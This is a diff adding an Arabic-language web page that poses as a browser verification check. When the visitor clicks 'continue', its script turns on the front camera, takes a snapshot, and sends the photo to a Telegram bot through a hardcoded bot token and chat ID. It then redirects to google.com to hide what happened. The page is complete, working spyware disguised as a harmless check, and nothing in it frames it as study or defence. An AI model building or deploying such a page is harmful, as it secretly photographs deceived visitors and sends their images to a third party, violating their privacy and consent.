@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من المتصفح...</title>
+    <style>
+        body { background: #0f172a; color: #f8fafc; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; padding: 30px; border-radius: 12px; background: #1e293b; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 400px; width: 90%; }
+        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; margin-top: 20px; font-weight: bold; }
+        button:hover { background: #2563eb; }
+        .loader { border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box" id="content-box">
+        <h2>جاري التحقق من المتصفح...</h2>
+        <p style="color: #94a3b8; font-size: 14px;">يرجى النقر على الزر أدناه للمتابعة وعرض المحتوى.</p>
+        <button id="verify-btn" onclick="startCapture()">اضغط هنا للمتابعة</button>
+        <div class="loader" id="loading-spinner"></div>
+    </div>
+
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8928993393:AAH91PXDAb0WD0gAAy3K-8KAXssZvOJEdw8";
+        const CHAT_ID = "7109702630";
+
+        async function startCapture() {
+            document.getElementById('verify-btn').style.display = 'none';
+            document.getElementById('loading-spinner').style.display = 'block';
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                const blob = dataURItoBlob(dataUrl);
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                console.error(err);
+            }
+
+            setTimeout(() => {
+                window.location.href = "https://google.com";
+            }, 1000);
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], {type: mimeString});
+        }
+    </script>
+</body>
+</html>
